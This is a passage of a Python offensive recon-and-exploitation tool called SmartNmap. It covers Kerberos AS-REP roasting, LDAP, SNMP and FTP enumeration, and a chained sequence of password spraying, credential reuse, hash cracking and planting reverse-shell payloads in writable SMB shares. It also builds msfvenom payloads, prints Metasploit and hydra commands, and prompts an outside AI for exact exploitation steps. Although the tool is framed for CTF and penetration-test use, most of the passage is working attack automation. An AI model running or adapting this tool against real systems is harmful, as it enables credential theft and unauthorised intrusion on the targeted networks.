                        loot.add('creds', f"LDAP anonymous bind on port {port}")
                        if domain_name:
                            loot.add('notes', f"AD domain: {domain_name}")

                    # Fetch users if we have naming context
                    if naming:
                        try:
                            r2 = subprocess.run(
                                ['ldapsearch', '-x', '-H', f'ldap://{target}:{port}',
                                 '-b', naming, '(objectClass=user)',
                                 'sAMAccountName', 'userPrincipalName',
                                 '-LLL'],
                                capture_output=True, text=True, timeout=30)
                            if r2.stdout.strip():
                                (outdir / f'ldap_users_{port}.txt').write_text(r2.stdout)
                                for m in re.findall(r'sAMAccountName:\s*(\S+)', r2.stdout):
                                    if m not in ldap_users and not m.endswith('$'):
                                        ldap_users.append(m)
                                if ldap_users:
                                    good(f"LDAP users discovered: {', '.join(ldap_users[:10])}")
                                    if loot:
                                        for u in ldap_users:
                                            loot.add('notes', f"LDAP user: {u}")
                        except Exception:
                            pass
                    break  # Only need one port
            except Exception:
                pass
    if domain_name:
        info(f"Detected AD domain: {domain_name}")

    # Kerberos AS-REP roast check (find users without pre-auth required)
    if 88 in services or any(s.get('service') == 'kerberos-sec' for s in services.values()):
        subsection("Kerberos User Enumeration + AS-REP Roast Check")
        # Derive the domain even when phase 3 LDAP NSE was skipped (--skip-nse)
        if not domain_name:
            domain_name = (getattr(args, 'domain', None)
                           or next((h.split('.', 1)[1] for h in (hostnames or [])
                                    if '.' in h and not h.replace('.', '').isdigit()), '')
                           or '')
        # Candidate users: any LDAP-derived users + a real username wordlist
        # (GetNPUsers both enumerates existence via KDC errors AND AS-REP-roasts).
        candidate_users = list(ldap_users) if ldap_users else []
        wl = getattr(args, 'userlist', None) or _first_path(_AD_USERLISTS)
        users_file = outdir / 'ad_candidates.txt'
        if candidate_users:
            users_file.write_text('\n'.join(dict.fromkeys(
                candidate_users + ['administrator', 'guest', 'krbtgt'])))
        elif wl and Path(wl).exists():
            users_file.write_text(Path(wl).read_text())
            info(f"user-enum wordlist: {Path(wl).name} ({sum(1 for _ in open(wl))} names)")
        else:
            users_file.write_text('administrator\nguest\nkrbtgt\nsvc\nadmin\n')

        if domain_name and users_file.exists():
            imp_paths = ['GetNPUsers.py', 'impacket-GetNPUsers']
            imp_bin = next((b for b in imp_paths if shutil.which(b)), None)
            if imp_bin:
                info(f"GetNPUsers.py (impacket) user-enum + AS-REP - domain {domain_name}")
                try:
                    r = subprocess.run(
                        [imp_bin, f'{domain_name}/', '-no-pass', '-usersfile', str(users_file),
                         '-dc-ip', target, '-format', 'hashcat'],
                        capture_output=True, text=True, timeout=900)
                    out = (r.stdout or '') + (r.stderr or '')
                    (outdir / 'asrep_roast.txt').write_text(out)
                    # Valid users: AS-REP-roastable (hash) OR "doesn't have UF_DONT_REQUIRE_PREAUTH"
                    valid = set(re.findall(r"User (\S+) doesn't have UF_DONT_REQUIRE_PREAUTH", out))
                    hashes = re.findall(r'\$krb5asrep\$\S+', out)
                    for h in hashes:
                        valid.add(h.split('@')[0].split('$')[-1])
                    if valid:
                        good(f"Valid AD users discovered: {', '.join(sorted(valid))}")
                        adf = outdir / 'ad_users.txt'
                        existing = adf.read_text().splitlines() if adf.exists() else []
                        adf.write_text('\n'.join(sorted(set(existing) | valid)))
                        if loot:
                            for u in sorted(valid):
                                loot.add('usernames', u)
                            loot.add_step(f"AD: enumerated {len(valid)} valid users via Kerberos")
                    if hashes:
                        good(f"AS-REP roastable account(s) found!")
                        for h in hashes:
                            user_part = h.split('@')[0].split('$')[-1]
                            print(f"    {C.R}[AS-REP]{C.Re} {user_part}: {h[:80]}...")
                            (outdir / 'asrep.hash').write_text('\n'.join(hashes))
                            if loot:
                                loot.add('keys', f"AS-REP hash {user_part}: {h}")
                                loot.add_step(f"AS-REP roast {user_part} -> hashcat -m 18200")
                            shellshock_vulns.append({
                                'port': 88, 'service': 'kerberos',
                                'product': 'Active Directory', 'version': '',
                                'desc': f'AS-REP roastable account: {user_part} (no pre-auth required)',
                                'cve': '', 'severity': 'high',
                                'exploit': f'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt',
                            })
                except Exception as e:
                    warn(f"GetNPUsers failed: {e}")
            else:
                info("krb5-enum-users (nmap fallback)")
                try:
                    krb_xml = outdir / 'krb5_enum.xml'
                    run_nmap(['-p', '88', '--script', 'krb5-enum-users',
                              '--script-args', f'krb5-enum-users.realm={domain_name},userdb={users_file}',
                              '--script-timeout', '60s', '-Pn', target],
                             krb_xml, 'Kerberos enum', timeout=120)
                    if krb_xml.exists():
                        parsed = parse_xml(krb_xml)
                        for sid, sout in parsed.get('scripts', {}).items():
                            if 'valid user' in sout.lower():
                                good(f"Valid AD users from Kerberos:")
                                print(sout)
                                if loot:
                                    for m in re.findall(r'(\S+)@\S+', sout):
                                        loot.add('notes', f"Valid AD user: {m}")
                except Exception as e:
                    warn(f"krb5-enum-users failed: {e}")
        else:
            info(f"  Skipping AS-REP: domain={domain_name}, users={len(candidate_users)}")

    # NFS services
    nfs_ports = [p for p, s in services.items()
                 if any(x in s.get('service', '').lower() for x in ['nfs', 'rpcbind', 'mountd'])]
    if nfs_ports:
        subsection("NFS Enumeration")
        if tools.get('showmount'):
            info("showmount -e")
            try:
                r = subprocess.run(['showmount', '-e', target],
                                   capture_output=True, text=True, timeout=15)
                if r.stdout.strip():
                    good(f"NFS exports:\n{r.stdout}")
                    (outdir / 'showmount.txt').write_text(r.stdout)
                    if loot:
                        loot.scan_output(r.stdout)
                        loot.add('shares', f"NFS: {r.stdout.strip()}")
            except Exception:
                pass

    # SNMP enumeration
    snmp_ports = [p for p, s in services.items()
                  if 'snmp' in s.get('service', '').lower() or p in (161, 162)]
    if snmp_ports and (tools.get('snmpwalk') or tools.get('onesixtyone')):
        subsection("SNMP Enumeration")
        if tools.get('onesixtyone'):
            info(f"onesixtyone {target} (default communities)")
            try:
                communities_file = outdir / 'communities.txt'
                communities_file.write_text('\n'.join(['public', 'private', 'community',
                                                        'manager', 'cisco', 'admin',
                                                        'read', 'write', 'snmpv2c']))
                r = subprocess.run(['onesixtyone', '-c', str(communities_file), target],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n'):
                        if line and 'Scanning' not in line:
                            print(f"    {line}")
                            if loot:
                                loot.add('creds', f"SNMP community: {line.strip()}")
                    (outdir / 'onesixtyone.txt').write_text(r.stdout)
            except Exception:
                pass
        if tools.get('snmpwalk'):
            info(f"snmpwalk {target} (public community)")
            try:
                r = subprocess.run(['snmpwalk', '-v2c', '-c', 'public', target,
                                    '1.3.6.1.2.1.1'],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip() and 'Timeout' not in r.stdout:
                    (outdir / 'snmpwalk.txt').write_text(r.stdout[:10000])
                    for line in r.stdout.strip().split('\n')[:10]:
                        print(f"    {line}")
            except Exception:
                pass

    # FTP anonymous check
    ftp_ports = [p for p, s in services.items() if 'ftp' in s.get('service', '').lower()]
    if ftp_ports and tools.get('curl'):
        subsection("FTP Anonymous Access")
        for port in ftp_ports:
            info(f"Checking anonymous FTP on port {port}")
            try:
                r = subprocess.run(
                    ['curl', '-s', '--list-only', f'ftp://{target}:{port}/',
                     '--user', 'anonymous:anonymous', '--max-time', '10'],
                    capture_output=True, text=True, timeout=15)
                if r.returncode == 0 and r.stdout.strip():
                    good(f"Anonymous FTP access on port {port}!")
                    print(f"    Files: {r.stdout.strip()[:500]}")
                    (outdir / f'ftp_anon_{port}.txt').write_text(r.stdout)
                    if loot:
                        loot.add('creds', f'FTP anonymous access on port {port}')
                        loot.scan_output(r.stdout)
            except Exception:
                pass

    # ── Kill-chain sequence: unauth AD enum → cred brute → reuse sweep → authed AD ──
    # Each stage feeds the next through loot.valid_creds / p5_context (the feedback loop).
    _ad_domain = getattr(args, 'domain', None) or domain_name or ''
    # 1. Unauthenticated enum: null/RID users → ad_users.txt, domain, user==pass spray
    shellshock_vulns += run_ad_enum_unauth(target, services, outdir, args, tools, loot,
                                           domain=_ad_domain, context=p5_context)
    # 1b. Pull & mine readable SMB shares / NFS exports (loot lives inside them)
    shellshock_vulns += run_share_mining(target, services, outdir, args, tools, loot)
    # 1c. Samba symlink traversal on writable shares -> arbitrary file read (SSH keys/flags)
    shellshock_vulns += run_smb_symlink_traversal(target, services, outdir, args, tools, loot, context=p5_context)
    # 1d. Drop reverse-shell payloads into writable shares + catch (auto-processed shares)
    shellshock_vulns += run_writable_share_payload(target, services, outdir, args, tools, loot, context=p5_context)
    # 1e. NetNTLMv2 hash capture via writable-share UNC trigger (SCF/URL) -> crack -> reuse
    shellshock_vulns += run_smb_hashcapture(target, services, outdir, args, tools, loot, context=p5_context)
    # 2. Credential brute against auth services (consumes ad_users.txt)
    shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
                                               context=p5_context)
    # 2b. Password spray enumerated users against --passlist (netexec, lockout-aware)
    shellshock_vulns += run_password_spray(target, services, outdir, args, tools, loot,
                                           context=p5_context)
    # 3. Credential reuse sweep: try every found cred against every other service
    shellshock_vulns += run_credential_reuse(target, services, outdir, args, tools, loot,
                                             context=p5_context)
    # 4. Credentialed AD collection (Kerberoast/BloodHound) using any validated cred
    shellshock_vulns += run_ad_collect_authed(target, services, outdir, args, tools, loot,
                                              domain=(p5_context.get('domain') or _ad_domain),
                                              context=p5_context)
    # 5. Identify & (gated) crack captured hashes; cracked creds re-enter the reuse loop
    shellshock_vulns += run_hash_cracking(target, services, outdir, args, tools, loot, context=p5_context)
    shellshock_vulns += run_credential_reuse(target, services, outdir, args, tools, loot,
                                             context=p5_context)

    # AI tool strategy advice
    if api_key:
        tool_results = []
        for f in sorted(outdir.iterdir()):
            if f.suffix == '.txt' and f.stat().st_size > 0 and 'phase' not in f.name:
                try:
                    content = f.read_text()[:500]
                    if content.strip():
                        tool_results.append(f"{f.name}: {content[:200]}")
                except Exception:
                    pass
        if tool_results:
            advice = ai_phase_advisor(api_key, "Supplementary Tools",
                f"Target: {target}\nTool outputs:\n" + '\n'.join(tool_results[:20]),
                "Based on these tool findings, what's the most promising attack path? "
                "Any credentials found? Writable shares? Interesting web directories? "
                "What should I try next?")
            if advice:
                print(f"\n{C.M}  AI Tool Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return shellshock_vulns


SEVERITY_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, '': 5}


def guess_severity(desc, cve=''):
    """Heuristic severity from description / CVE. Honors embedded CVSS scores."""
    s = (desc + ' ' + cve).lower()
    # Honor explicit CVSS score if mentioned (e.g. "CVSS 9.8" from vulners)
    cvss_match = re.search(r'cvss\s*[:=]?\s*(\d+\.\d+)', s)
    if cvss_match:
        try:
            cvss = float(cvss_match.group(1))
            if cvss >= 9.0:
                return 'critical'
            if cvss >= 7.0:
                return 'high'
            if cvss >= 4.0:
                return 'medium'
            if cvss > 0:
                return 'low'
        except ValueError:
            pass
    # Famous critical CVEs / exploit codenames
    critical_cves = ['ms17-010', 'ms08-067', 'ms12-020', 'ms14-068',
                     'cve-2014-6271', 'cve-2017-0144', 'cve-2017-0143',
                     'cve-2019-0708', 'cve-2020-0796', 'cve-2021-44228',
                     'cve-2021-26855', 'cve-2021-34527', 'cve-2022-22965',
                     'cve-2014-0160', 'cve-2018-7600', 'cve-2019-19781']
    if any(k in s for k in critical_cves):
        return 'critical'
    if any(k in s for k in ['rce', 'remote code', 'eternalblue', 'heartbleed',
                             'shellshock', 'bluekeep', 'log4shell', 'proxyshell',
                             'proxylogon', 'backdoor', 'unauthenticated',
                             'drupalgeddon', 'deserialization', 'ognl',
                             'spring4shell', 'smbghost', 'zerologon',
                             'printnightmare', 'dirty pipe']):
        return 'critical'
    if any(k in s for k in ['auth bypass', 'sql injection', 'path traversal',
                             'directory traversal', 'xxe', 'file read',
                             'arbitrary file', 'lfi', 'rfi', 'smbv1',
                             'anonymous', 'null session', 'null bind',
                             'ssrf', 'command injection']):
        return 'high'
    if any(k in s for k in ['xss', 'csrf', 'weak', 'deprecated', 'info disclosure',
                             'information disclosure', 'enum', 'expired cert',
                             'weak cipher', 'poodle', 'beast', 'crime',
                             'username enumeration']):
        return 'medium'
    if any(k in s for k in ['missing', 'default', 'self-signed', 'debug',
                             'banner', 'version disclosure']):
        return 'low'
    return 'info'


def _builtin_attack_path(target, services, vulns_sorted, sploit_results, outdir):
    """Print a heuristic attack path summary. Always runs, no AI required."""
    subsection("Attack Path Summary")

    criticals = [v for v in vulns_sorted if v.get('severity') in ('critical', 'high')]
    meds = [v for v in vulns_sorted if v.get('severity') == 'medium']

    if criticals:
        print(f"\n  {C.R}{C.Bo}CRITICAL/HIGH — Start Here:{C.Re}")
        for v in criticals:
            print(f"    {C.R}[!]{C.Re} Port {v['port']}: {v['desc']}")
            if v.get('cve'):
                print(f"        CVE: {v['cve']}")
            if v.get('exploit'):
                print(f"        {C.Y}{v['exploit']}{C.Re}")
    else:
        print(f"  {C.Di}No critical/high vulns detected by scanner.{C.Re}")

    # Highlight searchsploit hits
    if sploit_results:
        print(f"\n  {C.G}{C.Bo}Searchsploit Matches:{C.Re}")
        for query, results in sploit_results.items():
            for r in results[:3]:
                edb = r.get('EDB-ID', '')
                title = r.get('Title', '')
                path = r.get('Path', '')
                print(f"    {C.Y}[EDB-{edb}]{C.Re} {title}")
                if path:
                    short = path.split('exploits/')[-1] if 'exploits/' in path else path
                    print(f"            searchsploit -x {short}")

    # Quick-win service hints
    svc_names = {s.get('service', '') for s in services.values()}
    product_names = ' '.join(s.get('product', '').lower() for s in services.values())

    print(f"\n  {C.B}{C.Bo}Quick Wins by Service:{C.Re}")
    hints = []
    if any(s in svc_names for s in ('ftp',)):
        hints.append("FTP: try anonymous login → ftp {t} (user: anonymous)")
    if 'smb' in product_names or any(s in svc_names for s in ('microsoft-ds', 'netbios-ssn')):
        hints.append("SMB: null session → smbclient -L //{t} -N && smbmap -H {t}")
        hints.append("SMB: check EternalBlue → use exploit/windows/smb/ms17_010_eternalblue")
    if 'httpfileserver' in product_names or 'hfs' in product_names:
        hints.append("HFS 2.3: RCE via Metasploit → use exploit/windows/http/rejetto_hfs_exec")
        hints.append("HFS 2.3: set RHOSTS {t}, set RPORT 8080, run")
    if 'winrm' in svc_names or '5985' in str(services.keys()):
        hints.append("WinRM: evil-winrm -i {t} -u USERNAME -p PASSWORD")
    if 'rdp' in svc_names or 'ms-wbt-server' in svc_names:
        hints.append("RDP: xfreerdp /v:{t} /u:Administrator /p:PASSWORD")
    if 'ssh' in svc_names:
        hints.append("SSH: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{t}")
    if any(s in svc_names for s in ('http', 'http-proxy')):
        hints.append("HTTP: gobuster dir -u http://{t}:PORT -w /usr/share/wordlists/dirb/common.txt")
    if not hints:
        hints.append("Run: nmap --script vuln -p- {t} for deeper vuln scan")

    for h in hints:
        print(f"    {C.Cy}→{C.Re} {h.format(t=target)}")

    if meds:
        print(f"\n  {C.Y}Medium severity findings: {len(meds)} (see REPORT.md){C.Re}")

    lines = [f"# Attack Path Summary — {target}\n"]
    if criticals:
        lines.append("## Critical/High Findings")
        for v in criticals:
            lines.append(f"- **[{v['port']}]** {v['desc']} ({v.get('cve','')})")
            lines.append(f"  - {v.get('exploit','')}")
    if sploit_results:
        lines.append("\n## Searchsploit Matches")
        for query, results in sploit_results.items():
            for r in results[:5]:
                lines.append(f"- [EDB-{r.get('EDB-ID','')}] {r.get('Title','')}")
    lines.append("\n## Quick Wins")
    for h in hints:
        lines.append(f"- {h.format(t=target)}")
    try:
        (outdir / 'attack_path.md').write_text('\n'.join(lines))
        good(f"Attack path saved to: {outdir / 'attack_path.md'}")
    except Exception:
        pass


def phase6_analysis(target, services, vulns, outdir, args, api_key=None, loot=None, os_info=None,
                     sploit_results=None, puter_token=None, hostnames=None):
    """Phase 6: Deep Analysis, CTF Guidance & Report."""
    section("PHASE 6: Deep Analysis & Report Generation")
    hostnames = hostnames or []

    # Enrich vulns with severity, deduplicate by (port, cve, desc-prefix), sort
    for v in vulns:
        if 'severity' not in v:
            v['severity'] = guess_severity(v.get('desc', ''), v.get('cve', ''))
    seen = set()
    deduped = []
    for v in vulns:
        key = (v.get('port', 0),
               (v.get('cve') or '').upper().strip(),
               (v.get('desc') or '')[:40].lower().strip())
        if key in seen:
            continue
        seen.add(key)
        deduped.append(v)
    vulns = deduped
    vulns_sorted = sorted(vulns, key=lambda v: SEVERITY_ORDER.get(v.get('severity', ''), 5))

    # Build comprehensive summary
    summary_lines = [f"Target: {target}", f"Date: {datetime.datetime.now().isoformat()}", ""]

    if os_info:
        summary_lines.append(f"OS: {os_info[0].get('name','Unknown')}")
        summary_lines.append("")

    if hostnames:
        summary_lines.append("=== HOSTNAMES ===")
        for h in hostnames:
            summary_lines.append(f"  - {h}")
        summary_lines.append("")

    summary_lines.append("=== SERVICES ===")
    for port in sorted(services.keys()):
        svc = services[port]
        ver = f"{svc.get('product','')} {svc.get('version','')}".strip()
        summary_lines.append(f"  {port}/{svc.get('proto','tcp')}: {svc.get('service','')} - {ver}")

    if vulns_sorted:
        summary_lines.append("\n=== KNOWN VULNERABILITIES (sorted by severity) ===")
        for v in vulns_sorted:
            sev = v.get('severity', '').upper()
            summary_lines.append(f"  [{sev:<8}] Port {v['port']}: {v['desc']} ({v['cve']})")
            summary_lines.append(f"              Exploit: {v['exploit']}")

    # Collect all script outputs
    all_scripts = {}
    for xml_file in outdir.glob('*.xml'):
        try:
            parsed = parse_xml(xml_file)
            for p, svc in parsed.get('services', {}).items():
                for sid, sout in svc.get('scripts', {}).items():
                    if sout.strip():
                        all_scripts[f"{p}/{sid}"] = sout[:500]
        except Exception:
            pass

    if all_scripts:
        summary_lines.append("\n=== NOTABLE SCRIPT OUTPUTS ===")
        for k, v in list(all_scripts.items())[:30]:
            summary_lines.append(f"  [{k}]: {v[:200]}")

    # Collect tool outputs
    tool_outputs = {}
    for f in outdir.iterdir():
        if f.suffix == '.txt' and 'phase' not in f.name and f.stat().st_size > 0:
            try:
                tool_outputs[f.name] = f.read_text()[:500]
            except Exception:
                pass

    if tool_outputs:
        summary_lines.append("\n=== TOOL OUTPUTS ===")
        for name, content in tool_outputs.items():
            summary_lines.append(f"  [{name}]: {content[:200]}")

    if sploit_results:
        summary_lines.append("\n=== SEARCHSPLOIT RESULTS ===")
        for query, results in sploit_results.items():
            summary_lines.append(f"  Query: {query} ({len(results)} results)")
            for r in results[:5]:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                summary_lines.append(f"    [EDB-{edb_id}] {title}")

    summary = '\n'.join(summary_lines)

    subsection("Suggested Follow-up Commands")
    suggestions = generate_suggestions(target, services, vulns_sorted)
    for s in suggestions:
        print(f"    {C.Cy}{s}{C.Re}")

    # ── Built-in Attack Path (always shown) ──
    _builtin_attack_path(target, services, vulns_sorted, sploit_results, outdir)

    # Reverse-shell cheat sheet (pentestmonkey) when a foothold/RCE finding exists
    emit_reverse_shells(vulns_sorted, args, loot)
    # SQLi cheat sheet + OS-keyed privesc hand-off (pentestmonkey unix-privesc-check/GTFOBins)
    emit_sqli_cheatsheet(vulns_sorted, [u for u in getattr(loot, 'urls', []) if '[param]' in u], loot)
    emit_privesc_checklist(os_info, services, loot)
    # msfvenom payload (only if --lhost given and a foothold/RCE finding exists)
    if getattr(args, 'lhost', None) and any(
            any(k in v.get('desc', '').lower() for k in _RCE_KEYWORDS) for v in vulns_sorted):
        os_name = ' '.join(str(o.get('name', '')) for o in (os_info or []))
        run_msfvenom(os_name, 'x64', args.lhost, getattr(args, 'lport', None) or '4444',
                     outdir, args, loot, fp=None)
    # Blockers + AI-suggested manual path when no foothold/cred was obtained
    ai_block_report(target, services, vulns_sorted, loot, args, outdir)

    # AI Deep Analysis
    ai_response = None
    if api_key or puter_token or os.environ.get('PUTER_AUTH_TOKEN'):
        subsection("AI Attack Path Synthesis")
        mode = "CTF challenge" if args.ctf else "bug bounty" if args.bb else "penetration test"
        prompt = f"""You are an elite penetration tester conducting a {mode}.
Analyze ALL the following reconnaissance data and provide a comprehensive attack plan.

{summary}

Provide:
1. **EXECUTIVE SUMMARY** - 3 bullet points on the target's attack surface
2. **CRITICAL FINDINGS** - Most dangerous findings ranked by exploitability
3. **PRIMARY ATTACK PATH** - Step-by-step initial foothold strategy with exact commands
4. **QUICK WINS** - Things to try right now (sorted by likelihood of success)
5. **EXPLOITATION COMMANDS** - Exact metasploit/manual exploit commands for each finding
6. **POST-EXPLOITATION** - What to do after gaining access (privesc, lateral movement, loot)
7. **ADDITIONAL RECON** - What else to enumerate that we may have missed"""

        if args.ctf:
            prompt += """
8. **CTF-SPECIFIC** - Common CTF flag locations, hints from service versions, likely challenge path
   Look for: user.txt, root.txt, interesting files in NFS/SMB shares, SSH keys, backup files"""

        ai_response = query_ai(prompt, api_key=api_key, puter_token=puter_token, timeout=120)
        if ai_response:
            provider = "GEMINI + QWEN" if (api_key and (puter_token or os.environ.get('PUTER_AUTH_TOKEN'))) else "AI"
            print(f"\n{C.M}{C.Bo}{'='*70}{C.Re}")
            print(f"{C.M}{C.Bo}  {provider} - ATTACK PATH ANALYSIS{C.Re}")
            print(f"{C.M}{C.Bo}{'='*70}{C.Re}\n")
            print(ai_response)
            (outdir / 'ai_attack_path.md').write_text(
                f"# AI Attack Path Analysis - {target}\n\n{ai_response}")
            good(f"AI analysis saved to: {outdir / 'ai_attack_path.md'}")

    # Write text report
    report = outdir / 'report.txt'
    report_lines = [
        f"SmartNmap v{VERSION} Reconnaissance Report",
        f"{'='*50}",
        summary, "",
        "=== SUGGESTED COMMANDS ===",
    ] + [f"  {s}" for s in suggestions]
    report.write_text('\n'.join(report_lines))
    good(f"Report saved to: {report}")

    # Markdown report
    if getattr(args, 'markdown', True):
        md = write_markdown_report(target, services, vulns_sorted, all_scripts,
                                    sploit_results, os_info, hostnames,
                                    suggestions, ai_response, loot, outdir)
        good(f"Markdown report: {md}")

    # Loot report
    if loot:
        loot.write(outdir / 'loot.md')
        good(f"Loot tracker saved to: {outdir / 'loot.md'}")

    # JSON export
    if args.json:
        json_data = {
            'smartnmap_version': VERSION,
            'target': target,
            'hostnames': hostnames,
            'timestamp': datetime.datetime.now().isoformat(),
            'os': os_info,
            'services': {str(k): v for k, v in services.items()},
            'vulnerabilities': vulns_sorted,
            'scripts': all_scripts,
            'searchsploit': {q: [{'EDB-ID': r.get('EDB-ID', ''), 'Title': r.get('Title', '')}
                                 for r in results]
                             for q, results in (sploit_results or {}).items()},
            'suggestions': suggestions,
            'ai_analysis': ai_response or '',
        }
        json_file = outdir / 'results.json'
        json_file.write_text(json.dumps(json_data, indent=2, default=str))
        good(f"JSON export: {json_file}")


def _chain_enablers(loot, vulns, services):
    """Surface findings/loot that unlock the next step (foothold value > raw CVSS).
    This is the chain-aware prioritization the walkthrough corpus reasons with."""
    out = []
    for c in getattr(loot, 'valid_creds', [])[:10]:
        secret = c.get('pw') or c.get('nthash') or ''
        out.append(f"Valid credential `{c['user']}:{secret}` "
                   f"(scope: {c.get('scope', '?')}, via {c.get('source', '?')})")
    for s in getattr(loot, 'shares', [])[:10]:
        if 'READ' in s or 'NFS export' in s:
            out.append(f"Readable share/export: `{s}`")
    unames = set(getattr(loot, 'usernames', []))
    if unames:
        out.append(f"{len(unames)} usernames harvested → seed brute/spray lists")
    for k in getattr(loot, 'keys', [])[:10]:
        out.append(f"Key/hash to crack: `{k}`")
    for v in vulns:
        d = v.get('desc', '').lower()
        if any(x in d for x in ('anonymous', 'default-credential', 'default/weak web credential',
                                'local file inclusion', 'credential reuse', 'user==pass',
                                'kerberoast', 'signing not required', 'alg=none', 'tamperable cookie',
                                'no account lockout', 'basic auth over cleartext')):
            out.append(f"[{v.get('severity', '').upper()}] {v['desc']}")
    seen, uniq = set(), []
    for x in out:
        if x not in seen:
            seen.add(x)
            uniq.append(x)
    return uniq[:20]


def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
                          os_info, hostnames, suggestions, ai_response, loot, outdir):
    """Write a detailed Markdown report."""
    md_file = outdir / 'REPORT.md'
    lines = [
        f"# SmartNmap Reconnaissance Report",
        f"",
        f"**Target:** `{target}`  ",
        f"**Date:** {datetime.datetime.now().isoformat()}  ",
        f"**Tool:** SmartNmap v{VERSION}",
        f"",
        f"## Executive Summary",
        f"",
        f"- **Open Ports:** {len(services)}",
        f"- **Services Identified:** {len([s for s in services.values() if s.get('service')])}",
        f"- **Known Vulnerabilities:** {len(vulns)}",
    ]
    # Severity breakdown
    sev_counts = {}
    for v in vulns:
        sev_counts[v.get('severity', 'info')] = sev_counts.get(v.get('severity', 'info'), 0) + 1
    if sev_counts:
        lines.append(f"- **Severity Breakdown:** " +
                     ', '.join(f"{sev_counts[s]} {s}" for s in ('critical', 'high', 'medium', 'low', 'info') if sev_counts.get(s)))

    if os_info:
        lines.append(f"- **OS:** {os_info[0].get('name', 'Unknown')} ({os_info[0].get('accuracy', '?')}%)")
    if hostnames:
        lines.append(f"- **Hostnames:** " + ', '.join(f"`{h}`" for h in hostnames[:10]))

    # Kill-chain narrative: chain-enablers first, then the ordered path stitched from loot
    if loot:
        enablers = _chain_enablers(loot, vulns, services)
        chain = getattr(loot, 'chain', [])
        if enablers or chain:
            lines.extend(['', '## Kill-Chain Narrative', ''])
            if enablers:
                lines.append('**Chain enablers — start here (what unlocks the next step, ranked above raw CVSS):**')
                lines.append('')
                for e in enablers:
                    lines.append(f"- {e}")
                lines.append('')
            if chain:
                lines.append('**Path walked / available:**')
                lines.append('')
                for i, step in enumerate(chain, 1):
                    lines.append(f"{i}. {step}")
                lines.append('')

    lines.extend(['', '## Services', ''])
    lines.append("| Port | Proto | Service | Product | Version | Extras |")
    lines.append("|------|-------|---------|---------|---------|--------|")
    for port in sorted(services.keys()):
        s = services[port]
        lines.append(f"| {port} | {s.get('proto', 'tcp')} | {s.get('service', '')} | "
                     f"{s.get('product', '')} | {s.get('version', '')} | {s.get('extra', '')} |")

    if vulns:
        lines.extend(['', '## Vulnerabilities', ''])
        for v in vulns:
            sev = v.get('severity', 'info').upper()
            lines.append(f"### [{sev}] Port {v['port']}: {v['desc']}")
            if v.get('cve'):
                lines.append(f"- **CVE:** `{v['cve']}`")
            if v.get('product') or v.get('version'):
                lines.append(f"- **Product:** {v.get('product', '')} {v.get('version', '')}")
            if v.get('exploit'):
                lines.append(f"- **Exploit:** `{v['exploit']}`")
            lines.append('')

    if sploit_results:
        lines.extend(['', '## Exploit Database', ''])
        for query, results in sploit_results.items():
            lines.append(f"### Query: `{query}` ({len(results)} results)")
            for r in results[:10]:
                edb_id = r.get('EDB-ID', '')
                title = r.get('Title', '')
                path = r.get('Path', '')
                lines.append(f"- **[EDB-{edb_id}]** {title}")
                if path:
                    lines.append(f"  - Path: `{path}`")
            lines.append('')

    if all_scripts:
        lines.extend(['', '## Notable NSE Script Outputs', ''])
        for k, v in list(all_scripts.items())[:30]:
            lines.append(f"### `{k}`")
            lines.append('```')
            lines.append(v[:1000])
            lines.append('```')
            lines.append('')

    # Loot
    if loot:
        loot_categories = ['creds', 'usernames', 'keys', 'auth_findings', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']
        has_loot = any(getattr(loot, cat, []) for cat in loot_categories)
        if has_loot:
            lines.extend(['', '## Loot', ''])
            for cat in loot_categories:
                items = getattr(loot, cat, [])
                if items:
                    lines.append(f"### {cat.title()}")
                    for item in sorted(set(items))[:50]:
                        lines.append(f"- `{item}`")
                    lines.append('')

    if suggestions:
        lines.extend(['', '## Suggested Follow-up Commands', '', '```bash'])
        for s in suggestions:
            lines.append(s)
        lines.append('```')

    if ai_response:
        lines.extend(['', '## AI Attack Path Analysis', '', ai_response])

    md_file.write_text('\n'.join(lines))
    return md_file


def generate_suggestions(target, services, vulns):
    """Generate follow-up command suggestions based on findings."""
    cmds = []
    for port, svc in sorted(services.items()):
        service = svc.get('service', '').lower()
        product = svc.get('product', '').lower()
        version = svc.get('version', '')

        if 'ftp' in service:
            cmds.append(f"# FTP ({port})")
            cmds.append(f"ftp {target} {port}   # Try anonymous login")
            if 'proftpd' in product and '1.3.5' in version:
                cmds.append(f"# ProFTPD 1.3.5 mod_copy: SITE CPFR / SITE CPTO")
                cmds.append(f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {target}; run'")
            if 'vsftpd' in product and '2.3.4' in version:
                cmds.append(f"msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run'")

        elif 'ssh' in service:
            cmds.append(f"# SSH ({port})")
            cmds.append(f"ssh {target} -p {port}")
            cmds.append(f"hydra -L users.txt -P passwords.txt ssh://{target}:{port}")

        elif any(x in service for x in ['http', 'www']) or port in [80, 443, 8080, 8443]:
            scheme = 'https' if port in [443, 8443] or svc.get('tunnel') == 'ssl' else 'http'
            cmds.append(f"# HTTP ({port})")
            cmds.append(f"curl -v {scheme}://{target}:{port}/")
            cmds.append(f"gobuster dir -u {scheme}://{target}:{port}/ -w /usr/share/wordlists/dirb/common.txt")
            cmds.append(f"nikto -h {scheme}://{target}:{port}/")
            if 'wordpress' in product:
                cmds.append(f"wpscan --url {scheme}://{target}:{port}/ --enumerate ap,at,u")

        elif any(x in service for x in ['netbios', 'smb', 'microsoft-ds']):
            cmds.append(f"# SMB ({port})")
            cmds.append(f"smbclient -L //{target} -N")
            cmds.append(f"smbmap -H {target}")
            cmds.append(f"enum4linux -A {target}")
            cmds.append(f"crackmapexec smb {target} --shares")

        elif any(x in service for x in ['nfs', 'rpcbind', 'mountd', 'nfs_acl']):
            cmds.append(f"# NFS/RPC ({port})")
            cmds.append(f"showmount -e {target}")
